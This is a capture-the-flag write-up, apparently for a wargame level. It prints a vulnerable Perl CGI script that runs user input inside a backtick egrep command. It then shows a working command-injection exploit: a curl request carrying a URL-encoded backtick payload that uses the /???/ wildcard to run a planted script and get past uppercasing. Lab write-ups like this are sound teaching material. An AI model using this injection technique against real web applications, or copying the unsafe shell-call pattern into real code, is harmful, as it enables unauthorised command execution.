# foothold

I also have some info for this user from the initial emumeration.

We know this user has an apache site, and a `/var/www/level12` directory.

I also see a `level12.pl` file on the home.

A quick diff of `/var/www/level12/level12.pl` and `~/level12.pl` reveals that,
indeed, they are the same file.

I open it and found some weird perl stuff. I hate perl...

Here the code for reference:
```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

We can see the code call the `t()` function, and `n()` will print one or two
dots depending on the result.

`n()` seems dumb, so the exploit must be in `t()`.

At first sight is easy to notice that `t()` is running a shell command, let's
try to inject.

# exploit

Some tricky command injection, not everything in bash are the letters:
```bash
# Create the file so 'egrep' doesn't fail
touch /tmp/xd

# Wildcard
echo -ne '#!/bin/bash\ngetflag > /tmp/uwu\n' > /tmp/GETFLAG
chmod 777 /tmp/GETFLAG
curl -v http://localhost:4646?x=%60%2F%3F%3F%3F%2FGETFLAG%60&y=
# curl -v http://localhost:4646?x=/???/GETFLAG&y=
```

And that's the flag.

It took me I while to realize, I was alerady on the path of creating a script
with an upper case file name, but I was strugling thinking how to execute it,
until I decided to `man ascii` and check what symbols I had available for use.
